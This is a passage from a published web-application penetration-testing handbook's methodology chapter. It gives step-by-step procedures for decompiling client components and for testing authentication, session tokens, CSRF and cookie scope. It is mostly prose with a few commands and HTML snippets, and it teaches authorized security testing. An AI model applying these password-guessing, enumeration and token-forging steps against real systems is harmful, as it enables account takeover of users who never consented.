 3.3.2.4 Use a suitable tool to decompile the bytecode into source code. For 
example:
C:\>jad.exe input.class
Parsing input.class... Generating input.jad
Here are some suitable tools for decompiling different browser extension components:
n Java ‚Äî Jad
n Flash ‚Äî SWFScan, Flasm/Flare
n Silverlight ‚Äî .NET Reflector
If the applet is packaged into a JAR, XAP, or SWF fi le, you can unpack 
it using a standard archive reader such as WinRar or WinZip.
 3.3.2.5 Review the relevant source code (starting with the implementation of 
the method that returns the opaque data) to understand what processing 
is being performed.
 3.3.2.6 Determine whether the applet contains any public methods that can be 
used to perform the relevant obfuscation on arbitrary input.
 3.3.2.7 If it doesn‚Äôt, modify the applet‚Äôs source to neutralize any validation it 
performs or to allow you to obfuscate arbitrary input. You can then 
recompile the source into its original fi le format using the compilation 
tools provided by the vendor.
3.3.3 Attach a Debugger
 3.3.3.1 For large client-side applications, it is often prohibitively diffi cult to 
decompile the whole application, modify it, and repackage it without 
c21.indd 803 c21.indd 803 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 804
804 Chapter 21 n A Web Application Hacker‚Äôs Methodology
encountering numerous errors. For these applications it is generally 
quicker to attach a runtime debugger to the process. JavaSnoop does this 
very well for Java. Silverlight Spy is a freely available tool that allows 
runtime monitoring of Silverlight clients.
 3.3.3.2 Locate the key functions and values the application employs to drive 
security-related business logic, and place breakpoints when the targeted 
function is called. Modify the arguments or return value as needed to 
affect the security bypass.
3.3.4 Test ActiveX controls
 3.3.4.1 Identify any ActiveX controls employed by the application. Look for 
any .cab fi le types being requested via your intercepting proxy, or look 
for object tags within the HTML source code of application pages. For 
example:
<OBJECT
 classid=‚ÄùCLSID:4F878398-E58A-11D3-BEE9-00C04FA0D6BA‚Äù
 codebase=‚Äùhttps://wahh app.com/scripts/input.cab‚Äù
 id=‚ÄùTheAxControl‚Äù>
</OBJECT>
 3.3.4.2 It is usually possible to subvert any input validation performed within 
an ActiveX control by attaching a debugger to the process and directly 
modifying data being processed or altering the program‚Äôs execution 
path. See Chapter 5 for more details about this kind of attack.
 3.3.4.3 It is often possible to guess the purpose of different methods that an 
ActiveX control exports based on their names and the parameters 
passed to them. Use the COMRaider tool to enumerate the methods 
exported by the control. Test whether any of these can be manipulated to affect the control‚Äôs behavior and defeat any validation tests 
it implements.
 3.3.4.4 If the control‚Äôs purpose is to gather or verify certain information about 
the client computer, use the Filemon and Regmon tools to monitor the 
information the control gathers. It is often possible to create suitable 
items within the system registry and fi lesystem to fi x the inputs used 
by the control and therefore affect its behavior.
 3.3.4.5 Test any ActiveX controls for vulnerabilities that could be exploited to 
attack other users of the application. You can modify the HTML used 
to invoke a control to pass arbitrary data to its methods and monitor 
the results. Look for methods with dangerous-sounding names, such 
as LaunchExe. You can also use COMRaider to perform some basic fuzz 
testing of ActiveX controls to identify fl aws such as buffer overfl ows.
c21.indd 804 c21.indd 804 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 805
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 805
4 Test the Authentication Mechanism
Figure 21-5: Testing the authentication mechanism
Data attacks Authentication
logic
Special functions Credential handling
4.1. Understand the mechanism
4.2. Test password
quality
4.3. Test for
username
enumeration
4.5. Test account
recovery
4.6. Test ‚Äúremember
me‚Äù
4.7. Test
impersonation
functions
4.4. Test for
password guessing
4.8. Test username
uniqueness
4.9. Test credential
predictability
4.10. Check for
unsafe transmission
4.13.1. Test for
fail-open logic
4.13.2. Test
multistage
processes
4.14. Exploit vulnerabilities
4.11. Check for
unsafe distribution
4.12. Check for
insecure storage
4.1 Understand the Mechanism
 4.1.1 Establish the authentication technologies in use (for example, forms, 
certifi cates, or multifactor).
 4.1.2 Locate all the authentication-related functionality (including login, 
registration, account recovery, and so on).
 4.1.3 If the application does not implement an automated self-registration 
mechanism, determine whether any other means exists of obtaining 
several user accounts.
c21.indd 805 c21.indd 805 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 806
806 Chapter 21 n A Web Application Hacker‚Äôs Methodology
4.2 Test Password Quality
 4.2.1 Review the application for any description of the minimum quality rules 
enforced on user passwords.
 4.2.2 Attempt to set various kinds of weak passwords, using any self-registration 
or password change functions to establish the rules actually enforced. 
Try short passwords, alphabetic characters only, single-case characters 
only, dictionary words, and the current username.
 4.2.3 Test for incomplete validation of credentials. Set a strong and complex 
password (for example, 12 characters with mixed-case letters, numerals, 
and typographic characters). Attempt to log in using different variations on this password, by removing the last character, by changing a 
character‚Äôs case, and by removing any special characters. If any of these 
login attempts is successful, continue experimenting systematically to 
identify what validation is actually being performed.
 4.2.4 Having established the minimum password quality rules, and the extent 
of password validation, identify the range of values that a passwordguessing attack would need to employ to have a good probability of 
success. Attempt to locate any built-in accounts that may not have been 
subject to the standard password complexity requirements.
4.3 Test for Username Enumeration
 4.3.1 Identify every location within the various authentication functions 
where a username is submitted, including via an on-screen input fi eld, 
a hidden form fi eld, or a cookie. Common locations include the primary 
login, self-registration, password change, logout, and account recovery.
 4.3.2 For each location, submit two requests, containing a valid and an invalid 
username. Review every detail of the server‚Äôs responses to each pair of 
requests, including the HTTP status code, any redirects, information 
displayed on-screen, any differences hidden in the HTML page source, 
and the time taken for the server to respond. Note that some differences 
may be subtle (for example, the same error message may contain minor 
typographical differences). You can use the history function of your 
intercepting proxy to review all traffi c to and from the server. WebScarab 
has a function to compare two responses to quickly highlight any differences between them.
 4.3.3 If you observe any differences between the responses where a valid and 
invalid username is submitted, repeat the test with a different pair of 
values and confi rm that a systematic difference exists that can provide 
a basis for automated username enumeration.
c21.indd 806 c21.indd 806 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 807
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 807
 4.3.4 Check for any other sources of information leakage within the application that may enable you to compile a list of valid usernames. Examples 
are logging functionality, actual listings of registered users, and direct 
mention of names or e-mail addresses in source code comments.
 4.3.5 Locate any subsidiary authentication that accepts a username, and 
determine whether it can be used for username enumeration. Pay 
specifi c attention to a registration page that allows specifi cation of a 
username.
4.4 Test Resilience to Password Guessing
 4.4.1 Identify every location within the application where user credentials 
are submitted. The two main instances typically are the main login 
function and the password change function. The latter normally is a 
valid target for password-guessing attacks only if an arbitrary username 
can be supplied.
 4.4.2 At each location, using an account that you control, manually send 
several requests containing the valid username but other invalid 
credentials. Monitor the application‚Äôs responses to identify any differences. After about 10 failed logins, if the application has not returned 
a message about account lockout, submit a request containing valid 
credentials. If this request succeeds, an account lockout policy probably is not in force.
 4.4.3 If you do not control any accounts, attempt to enumerate or guess a 
valid username, and make several invalid requests using this guess, 
monitoring for any error messages about account lockout. Of course, 
you should be aware that this test may have the effect of suspending or 
disabling an account belonging to another user.
4.5 Test Any Account Recovery Function
 4.5.1 Identify whether the application contains any facility for users to regain 
control of their account if they have forgotten their credentials. This 
is often indicated by a Forgot Your Password link near the main login 
function.
 4.5.2 Establish how the account recovery function works by doing a complete 
walk-through of the recovery process using an account you control.
 4.5.3 If the function uses a challenge such as a secret question, determine 
whether users can set or select their own challenge during registration. 
If so, use a list of enumerated or common usernames to harvest a list of 
challenges, and review this for any that appear to be easily guessable.
c21.indd 807 c21.indd 807 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 808
808 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 4.5.4 If the function uses a password hint, perform the same exercise to harvest a list of password hints, and identify any that appear to be easily 
guessable.
 4.5.5 Perform the same tests on any account-recovery challenges that you performed at the main login function to assess vulnerability to automated 
guessing attacks.
 4.5.6 If the function involves sending an e-mail to the user to complete the 
recovery process, look for any weaknesses that may enable you to take 
control of other users‚Äô accounts. Determine whether it is possible to 
control the address to which the e-mail is sent. If the message contains 
a unique recovery URL, obtain a number of messages using an e-mail 
address you control, and attempt to identify any patterns that may enable 
you to predict the URLs issued to other users. Apply the methodology 
described in step 5.3 to identify any predictable sequences.
4.6 Test Any Remember Me Function
 4.6.1 If the main login function or its supporting logic contains a Remember 
Me function, activate this and review its effects. If this function allows the 
user to log in on subsequent occasions without entering any credentials, 
you should review it closely for any vulnerabilities.
 4.6.2 Closely inspect all persistent cookies that are set when the Remember Me 
function is activated. Look for any data that identifi es the user explicitly 
or appears to contain some predictable identifi er of the user.
 4.6.3 Even where the data stored appears to be heavily encoded or obfuscated, 
review this closely, and compare the results of remembering several very 
similar usernames and/or passwords to identify any opportunities to 
reverse-engineer the original data. Apply the methodology described 
in step 5.2 to identify any meaningful data.
 4.6.4 Depending on your results, modify the contents of your cookie in suitable ways in an attempt to masquerade as other users of the application.
4.7 Test Any Impersonation Function
 4.7.1 If the application contains any explicit functionality that allows one 
user to impersonate another, review this closely for any vulnerabilities 
that may enable you to impersonate arbitrary users without proper 
authorization.
 4.7.2 Look for any user-supplied data that is used to determine the target 
of the impersonation. Attempt to manipulate this to impersonate 
c21.indd 808 c21.indd 808 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 809
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 809
other users, particularly administrative users, which may enable you 
escalate privileges.
 4.7.3 If you perform any automated password-guessing attacks against other 
user accounts, look for any accounts that appear to have more than one 
valid password, or multiple accounts that appear to have the same password. This may indicate the presence of a backdoor password, which 
administrators can use to access the application as any user.
4.8 Test Username Uniqueness
 4.8.1 If the application has a self-registration function that lets you specify 
a desired username, attempt to register the same username twice with 
different passwords.
 4.8.2 If the application blocks the second registration attempt, you can exploit 
this behavior to enumerate registered usernames.
 4.8.3 If the application registers both accounts, probe further to determine its 
behavior when a collision of username and password occurs. Attempt 
to change the password of one of the accounts to match that of the 
other. Also, attempt to register two accounts with identical usernames 
and passwords.
 4.8.4 If the application alerts you or generates an error when a collision of 
username and password occurs, you can probably exploit this to perform 
an automated guessing attack to discover another user‚Äôs password. Target 
an enumerated or guessed username, and attempt to create accounts 
that have this username and different passwords. When the application rejects a specifi c password, you have probably found the existing 
password for the targeted account.
 4.8.5 If the application appears to tolerate a collision of username and password without an error, log in using the colliding credentials. Determine 
what happens and whether the application‚Äôs behavior can be leveraged 
to gain unauthorized access to other users‚Äô accounts.
4.9 Test Predictability of Autogenerated Credentials
 4.9.1 If the application automatically generates usernames or passwords, try 
to obtain several values in quick succession and identify any detectable 
sequences or patterns.
 4.9.2 If usernames are generated in a predictable way, extrapolate backwards 
to obtain a list of possible valid usernames. You can use this as the basis 
for automated password-guessing and other attacks.
c21.indd 809 c21.indd 809 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 810
810 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 4.9.3 If passwords are generated in a predictable way, extrapolate the pattern 
to obtain a list of possible passwords issued to other application users. 
This can be combined with any lists of usernames you obtain to perform 
a password-guessing attack.
4.10 Check for Unsafe Transmission of Credentials
 4.10.1 Walk through all authentication-related functions that involve transmission of credentials, including the main login, account registration, 
password change, and any page that allows viewing or updating of 
user profi le information. Monitor all traffi c passing in both directions 
between the client and server using your intercepting proxy.
 4.10.2 Identify every case in which the credentials are transmitted in either 
direction. You can set interception rules in your proxy to fl ag messages 
containing specifi c strings.
 4.10.3 If credentials are ever transmitted in the URL query string, these are 
potentially vulnerable to disclosure in the browser history, on-screen, 
in server logs, and in the Referer header when third-party links are 
followed.
 4.10.4 If credentials are ever stored in a cookie, these are potentially vulnerable 
to disclosure via XSS attacks or local privacy attacks.
 4.10.5 If credentials are ever transmitted from the server to the client, these 
may be compromised via any vulnerabilities in session management or 
access controls, or in an XSS attack.
 4.10.6 If credentials are ever transmitted over an unencrypted connection, these 
are vulnerable to interception by an eavesdropper.
 4.10.7 If credentials are submitted using HTTPS but the login form itself is 
loaded using HTTP, the application is vulnerable to a man-in-the-middle 
attack that may be used to capture credentials.
4.11 Check for Unsafe Distribution of Credentials
 4.11.1 If accounts are created via some out-of-band channel, or the application has a self-registration function that does not itself determine all of 
a user‚Äôs initial credentials, establish the means by which credentials are 
distributed to new users. Common methods include sending a message 
to an e-mail or postal address.
c21.indd 810 c21.indd 810 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 811
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 811
 4.11.2 If the application generates account activation URLs that are distributed 
out-of-band, try to register several new accounts in close succession, 
and identify any sequence in the URLs you receive. If a pattern can 
be determined, try to predict the URLs sent to recent and forthcoming users, and attempt to use these URLs to take ownership of their 
accounts.
 4.11.3 Try to reuse a single activation URL multiple times, and see if the application allows this. If it doesn‚Äôt, try locking out the target account before 
reusing the URL, and see if the URL still works. Determine whether this 
enables you to set a new password on an active account.
4.12 Test for Insecure Storage
 4.12.1 If you gain access to hashed passwords, check for accounts that share 
the same hashed password value. Try to log in with common passwords 
for the most common hashed value.
 4.12.2 Use an offl ine rainbow table for the hashing algorithm in question to 
recover the cleartext value.
4.13 Test for Logic Flaws
4.13.1 Test for Fail-Open Conditions
 4.13.1.1 For each function in which the application checks a user‚Äôs credentials, 
including the login and password change functions, walk through the 
process in the normal way, using an account you control. Note every 
request parameter submitted to the application.
 4.13.1.2 Repeat the process numerous times, modifying each parameter in turn 
in various unexpected ways designed to interfere with the application‚Äôs 
logic. For each parameter, include the following changes:
n Submit an empty string as the value.
n Remove the name/value pair.
n Submit very long and very short values.
n Submit strings instead of numbers, and vice versa.
n Submit the same named parameter multiple times, with the same 
and different values.
c21.indd 811 c21.indd 811 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 812
812 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 4.13.1.3 Review closely the application‚Äôs responses to the preceding requests. If 
any unexpected divergences from the base case occur, feed this observation back into your framing of further test cases. If one modifi cation 
causes a change in behavior, try to combine this with other changes to 
push the application‚Äôs logic to its limits.
4.13.2 Test Any Multistage Mechanisms
4.13.2.1 If any authentication-related function involves submitting credentials 
in a series of different requests, identify the apparent purpose of each 
distinct stage, and note the parameters submitted at each stage.
 4.13.2.2 Repeat the process numerous times, modifying the sequence of requests 
in ways designed to interfere with the application‚Äôs logic, including 
the following tests:
n Proceed through all stages, but in a different sequence than the one 
intended.
n Proceed directly to each stage in turn, and continue the normal 
sequence from there.
n Proceed through the normal sequence several times, skipping each 
stage in turn, and continuing the normal sequence from the next stage.
n On the basis of your observations and the apparent purpose of each 
stage of the mechanism, try to think of further ways to modify the 
sequence and to access the different stages that the developers may 
not have anticipated.
 4.13.2.3 Determine whether any single piece of information (such as the username) is submitted at more than one stage, either because it is captured 
more than once from the user or because it is transmitted via the client 
in a hidden form fi eld, cookie, or preset query string parameter. If so, try 
submitting different values at different stages (both valid and invalid) 
and observing the effect. Try to determine whether the submitted item 
is sometimes superfl uous, or is validated at one stage and then trusted 
subsequently, or is validated at different stages against different checks. 
Try to exploit the application‚Äôs behavior to gain unauthorized access 
or reduce the effectiveness of the controls imposed by the mechanism.
 4.13.2.4 Look for any data that is transmitted via the client that has not been 
captured from the user at any point. If hidden parameters are used 
c21.indd 812 c21.indd 812 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 813
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 813
to track the state of the process across successive stages, it may be 
possible to interfere with the application‚Äôs logic by modifying these 
parameters in crafted ways.
 4.13.2.5 If any part of the process involves the application‚Äôs presenting a randomly varying challenge, test for two common defects:
n If a parameter specifying the challenge is submitted along with the 
user‚Äôs response, determine whether you can effectively choose your 
own challenge by modifying this value.
n Try proceeding as far as the varying challenge several times with 
the same username, and determine whether a different challenge 
is presented. If it is, you can effectively choose your own challenge by proceeding to this stage repeatedly until your desired 
challenge is presented.
4.14 Exploit Any Vulnerabilities to Gain 
Unauthorized Access
 4.14.1 Review any vulnerabilities you have identifi ed within the various authentication functions, and identify any that you can leverage to achieve 
your objectives in attacking the application. This typically involves 
attempting to authenticate as a different user ‚Äî if possible, a user with 
administrative privileges.
 4.14.2 Before mounting any kind of automated attack, note any account 
lockout defenses you have identifi ed. For example, when performing 
username enumeration against a login function, submit a common 
password with each request rather than a completely arbitrary value 
so as not to waste a failed login attempt on every username discovered. 
Similarly, perform any password-guessing attacks on a breadth-fi rst, 
not depth-fi rst, basis. Start your word list with the most common weak 
passwords, and proceed through this list, trying each item against 
every enumerated username.
 4.14.3 Take account of the password quality rules and the completeness of 
password validation when constructing word lists to use in any passwordguessing attack to avoid impossible or superfl uous test cases.
 4.14.4 Use the techniques described in Chapter 14 to automate as much 
work as possible and maximize the speed and effectiveness of your 
attacks.
c21.indd 813 c21.indd 813 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 814
814 Chapter 21 n A Web Application Hacker‚Äôs Methodology
5 Test the Session Management Mechanism
Figure 21-6: Testing the session management mechanism
5.1. Understand the mechanism
Token generation Token handling
5.2. Test for meaning 5.4. Check for insecure transmission
5.10. Check cookie scope
5.9. Check for CSRF
5.8. Test for session fixation
5.7. Test session termination
5.5. Check for disclosure in logs
5.6. Test mapping of tokens to sessions
5.3. Test for predictability
5.1 Understand the Mechanism
 5.1.1 Analyze the mechanism used to manage sessions and state. Establish 
whether the application uses session tokens or some other method of 
handling the series of requests received from each user. Note that some 
authentication technologies (such as HTTP authentication) may not 
require a full session mechanism to reidentify users post-authentication. 
Also, some applications use a sessionless state mechanism in which all 
state information is transmitted via the client, usually in an encrypted 
or obfuscated form.
 5.1.2 If the application uses session tokens, confi rm precisely which pieces 
of data are actually used to reidentify users. Items that may be used to 
transmit tokens include HTTP cookies, query string parameters, and 
hidden form fi elds. Several different pieces of data may be used collectively to reidentify the user, and different items may be used by different 
back-end components. Often, items that look like session tokens may 
not actually be employed as such by the application, such as the default 
cookie generated by the web server.
c21.indd 814 c21.indd 814 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 815
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 815
 5.1.3 To verify which items are actually being employed as session tokens, 
fi nd a page or function that is certainly session-dependent (such as a 
user-specifi c My Details page). Then make several requests for it, systematically removing each item you suspect is being used as a session 
token. If removing an item stops the session-dependent page from being 
returned, this may confi rm that the item is a session token. Burp Repeater 
is a useful tool for performing these tests.
 5.1.4 Having established which items of data are actually being used to reidentify users, for each token confi rm whether it is being validated in its 
entirety, or whether some subcomponents of the token are ignored. 
Change the token‚Äôs value 1 byte at a time, and check whether the modifi ed value is still accepted. If you fi nd that certain portions of the token 
are not actually used to maintain session state, you can exclude these 
from further analysis.
5.2 Test Tokens for Meaning
 5.2.1 Log in as several different users at different times, and record the tokens 
received from the server. If self-registration is available and you can choose 
your username, log in with a series of similar usernames that have small 
variations, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so 
on. If other user-specifi c data is submitted at the login or is stored in user 
profi les (such as an e-mail address), perform a similar exercise to modify 
that data systematically and capture the resulting tokens.
 5.2.2 Analyze the tokens you receive for any correlations that appear to be 
related to the username and other user-controllable data.
 5.2.3 Analyze the tokens for any detectable encoding or obfuscation. Look 
for a correlation between the length of the username and the length of 
the token, which strongly indicates that some kind of obfuscation or 
encoding is in use. Where the username contains a sequence of the same 
character, look for a corresponding character sequence in the token, 
which may indicate the use of XOR obfuscation. Look for sequences in 
the token that contain only hexadecimal characters, which may indicate 
hexadecimal encoding of an ASCII string or other information. Look for 
sequences ending in an equals sign and/or containing only the other 
valid Base64 characters: a to z, A to Z, 0 to 9, +, and /.
 5.2.4 If you can identify any meaningful data within your sample of session 
tokens, consider whether this is suffi cient to mount an attack that attempts 
to guess the tokens recently issued to other application users. Find a 
page of the application that is session-dependent, and use the techniques 
c21.indd 815 c21.indd 815 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 816
816 Chapter 21 n A Web Application Hacker‚Äôs Methodology
described in Chapter 14 to automate the task of generating and testing 
possible tokens.
5.3 Test Tokens for Predictability
 5.3.1 Generate and capture a large number of session tokens in quick succession, using a request that causes the server to return a new token (for 
example, a successful login request).
 5.3.2 Attempt to identify any patterns within your sample of tokens. In all 
cases you should use Burp Sequencer, as described in Chapter 7, to 
perform detailed statistical tests of the randomness properties of the 
application‚Äôs tokens. Depending on the results, it may also be useful to 
perform the following manual analysis:
n Apply your understanding of which tokens and subsequences the 
application actually uses to reidentify users. Ignore any data that is 
not used in this way, even if it varies between samples.
n If it is unclear what type of data is contained in the token, or in any 
individual component of it, try applying various decodings (for example, Base64) to see if any more meaningful data emerges. It may be 
necessary to apply several decodings in sequence.
n Try to identify any patterns in the sequences of values contained in 
each decoded token or component. Calculate the differences between 
successive values. Even if these appear to be chaotic, there may be a 
fixed set of observed differences, which narrows down the scope of 
any brute-force attack considerably.
n Obtain a similar sample of tokens after waiting for a few minutes, 
and repeat the same analysis. Try to detect whether any of the tokens‚Äô 
content is time-dependent.
 5.3.3 If you identify any patterns, capture a second sample of tokens using 
a different IP address and a different username. This will help you 
identify whether the same pattern is detected and whether tokens 
received in the fi rst exercise could be extrapolated to guess tokens 
received in the second.
 5.3.4 If you can identify any exploitable sequences or time dependencies, 
consider whether this is suffi cient to mount an attack that attempts 
to guess the tokens recently issued to other application users. Use the 
techniques described in Chapter 14 to automate the task of generating 
and testing possible tokens. Except in the simplest kind of sequences, 
it is likely that your attack will need to involve a customized script 
of some kind.
c21.indd 816 c21.indd 816 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 817
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 817
 5.3.5 If the session ID appears to be custom-written, use the ‚Äúbit fl ipper‚Äù 
payload source in Burp Intruder to sequentially modify each bit in the 
session token in turn. Grep for a string in the response that indicates 
whether modifying the token has not resulted in an invalid session, and 
whether the session belongs to a different user.
5.4 Check for Insecure Transmission of Tokens
 5.4.1 Walk through the application as normal, starting with unauthenticated 
content at the start URL, proceeding through the login process, and 
then going through all the application‚Äôs functionality. Make a note 
of every occasion on which a new session token is issued, and which 
portions of your communications use HTTP and which use HTTPS. 
You can use the logging function of your intercepting proxy to record 
this information.
 5.4.2 If HTTP cookies are being used as the transmission mechanism for session tokens, verify whether the secure fl ag is set, preventing them from 
ever being transmitted over HTTP connections.
 5.4.3 Determine whether, in the normal use of the application, session tokens 
are ever transmitted over an HTTP connection. If so, they are vulnerable 
to interception.
 5.4.4 In cases where the application uses HTTP for unauthenticated areas 
and switches to HTTPS for the login and/or authenticated areas of 
the application, verify whether a new token is issued for the HTTPS 
portion of the communications, or whether a token issued during the 
HTTP stage remains active when the application switches to HTTPS. 
If a token issued during the HTTP stage remains active, the token is 
vulnerable to interception.
 5.4.5 If the HTTPS area of the application contains any links to HTTP URLs, 
follow these and verify whether the session token is submitted. If it is, 
determine whether it continues to be valid or is immediately terminated 
by the server.
5.5 Check for Disclosure of Tokens in Logs
 5.5.1 If your application mapping exercises identifi ed any logging, monitoring, 
or diagnostic functionality, review these functions closely to determine 
whether any session tokens are disclosed within them. Confi rm who is 
normally authorized to access these functions. If they are intended for 
administrators only, determine whether any other vulnerabilities exist 
that could enable a lower-privileged user to access them.
c21.indd 817 c21.indd 817 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 818
818 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 5.5.2 Identify any instances where session tokens are transmitted within the 
URL. It may be that tokens are generally transmitted in a more secure 
manner, but that developers have used the URL in specifi c cases to 
work around a particular problem. If so, these may be transmitted in 
the Referer header when users follow any off-site links. Check for any 
functionality that enables you to inject arbitrary off-site links into pages 
viewed by other users.
 5.5.3 If you fi nd any way to gather valid session tokens issued to other users, 
look for a way to test each token to determine whether it belongs to an 
administrative user (for example, by attempting to access a privileged 
function using the token).
5.6 Check Mapping of Tokens to Sessions
 5.6.1 Log in to the application twice using the same user account, either from 
different browser processes or from different computers. Determine 
whether both sessions remain active concurrently. If they do, the application supports concurrent sessions, enabling an attacker who has 
compromised another user‚Äôs credentials to use these without risk of 
detection.
 5.6.2 Log in and log out several times using the same user account, either from 
different browser processes or from different computers. Determine 
whether a new session token is issued each time, or whether the same 
token is issued every time the same account logs in. If the latter occurs, 
the application is not really employing proper session tokens, but is 
using unique persistent strings to reidentify each user. In this situation, 
there is no way to protect against concurrent logins or properly enforce 
session timeout.
 5.6.3 If tokens appear to contain any structure and meaning, attempt to separate 
out components that may identify the user from those that appear to be 
inscrutable. Try to modify any user-related components of the token so 
that they refer to other known users of the application. Verify whether 
the application accepts the resulting token and whether it enables you 
to masquerade as that user. See Chapter 7 for examples of this kind of 
subtle vulnerability.
5.7 Test Session Termination
 5.7.1 When testing for session timeout and logout fl aws, focus solely on the 
server‚Äôs handling of sessions and tokens, rather than any events that occur 
on the client. In terms of session termination, nothing much depends on 
what happens to the token within the client browser.
c21.indd 818 c21.indd 818 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 819
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 819
 5.7.2 Check whether session expiration is implemented on the server:
n Log in to the application to obtain a valid session token.
n Wait for a period without using this token, and then submit a request 
for a protected page (such as My Details) using the token.
n If the page is displayed normally, the token is still active.
n Use trial and error to determine how long any session expiration 
timeout is, or whether a token can still be used days after the previous 
request that used it. Burp Intruder can be configured to increment 
the time interval between successive requests to automate this task.
 5.7.3 Check whether a logout function exists. If it does, test whether it effectively invalidates the user‚Äôs session on the server. After logging out, 
attempt to reuse the old token, and determine whether it is still valid by 
requesting a protected page using the token. If the session is still active, 
users remain vulnerable to some session hijacking attacks even after 
they have ‚Äúlogged out.‚Äù You can use Burp Repeater to keep sending a 
specifi c request from the proxy history to see whether the application 
responds differently after you log out.
5.8 Check for Session Fixation
 5.8.1 If the application issues session tokens to unauthenticated users, obtain 
a token and perform a login. If the application does not issue a fresh 
token following a successful login, it is vulnerable to session fi xation.
 5.8.2 Even if the application does not issue session tokens to unauthenticated 
users, obtain a token by logging in, and then return to the login page. If 
the application is willing to return this page even though you are already 
authenticated, submit another login as a different user using the same 
token. If the application does not issue a fresh token after the second 
login, it is vulnerable to session fi xation.
 5.8.3 Identify the format of session tokens that the application uses. Modify 
your token to an invented value that is validly formed, and attempt to 
log in. If the application allows you to create an authenticated session 
using an invented token, it is vulnerable to session fi xation.
 5.8.4 If the application does not support login, but processes sensitive user 
information (such as personal and payment details) and allows this to 
be displayed after submission (such as on a Verify My Order page), 
carry out the preceding three tests in relation to the pages displaying 
sensitive data. If a token set during anonymous usage of the application 
can later be used to retrieve sensitive user information, the application 
is vulnerable to session fi xation.
c21.indd 819 c21.indd 819 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 820
820 Chapter 21 n A Web Application Hacker‚Äôs Methodology
5.9 Check for CSRF
 5.9.1 If the application relies solely on HTTP cookies as its method of transmitting session tokens, it may be vulnerable to cross-site request forgery 
attacks.
 5.9.2 Review the application‚Äôs key functionality, and identify the specifi c 
requests that are used to perform sensitive actions. If an attacker can 
fully determine in advance parameters for any of these requests (that 
is, they do not contain any session tokens, unpredictable data, or other 
secrets), the application is almost certainly vulnerable.
 5.9.3 Create an HTML page that will issue the desired request without any 
user interaction. For GET requests, you can place an <img> tag with the 
src parameter set to the vulnerable URL. For POST requests, you can 
create a form that contains hidden fi elds for all the relevant parameters 
required for the attack and that has its target set to the vulnerable 
URL. You can use JavaScript to autosubmit the form as soon as the 
page loads. While logged in to the application, use the same browser 
to load your HTML page. Verify that the desired action is carried out 
within the application.
 5.9.4 If the application uses additional tokens within requests in an attempt to 
prevent CSRF attacks, test the robustness of these in the same manner as 
for session tokens. Also test whether the application is vulnerable to UI 
redress attacks, in order to defeat the anti-CSRF defenses (see Chapter 13 
for more details).
5.10 Check Cookie Scope
 5.10.1 If the application uses HTTP cookies to transmit session tokens (or 
any other sensitive data), review the relevant Set-Cookie headers, and 
check for any domain or path attributes used to control the scope of the 
cookies.
 5.10.2 If the application explicitly liberalizes its cookies‚Äô scope to a parent 
domain or parent directory, it may be leaving itself vulnerable to attacks 
via other web applications that are hosted within the parent domain 
or directory.
 5.10.3 If the application sets its cookies‚Äô domain scope to its own domain 
name (or does not specify a domain attribute), it may still be exposed 
to attacks via any applications hosted on subdomains. This is a consequence of how cookie scoping works. It cannot be avoided other than 
by not hosting any other applications on a subdomain of a securitysensitive application.
c21.indd 820 c21.indd 820 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 821
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 821
 5.10.4 Determine any reliance on segregation by path, such as /site/main and 
/site/demo, which can be subverted in the event of a cross-site scripting 
attack.
 5.10.5 Identify all the possible domain names and paths that will receive the 
cookies that the application issues. Establish whether any other web 
applications are accessible via these domain names or paths that you 
may be able to leverage to capture the cookies issued to users of the 
target application.
6 Test Access Controls
Figure 21-7: Testing access controls
6.1. Understand the requirements
6.2. Test with
multiple accounts
6.3. Test with
limited access
6.4. Test for
insecure methods
6.1 Understand the Access Control Requirements
 6.1.1 Based on the core functionality implemented within the application, 
understand the broad requirements for access control in terms of vertical segregation (different levels of users have access to different types 
of functionality) and horizontal segregation (users at the same privilege 
level have access to different subsets of data). Often, both types of segregation are present. For example, ordinary users may be able to access 
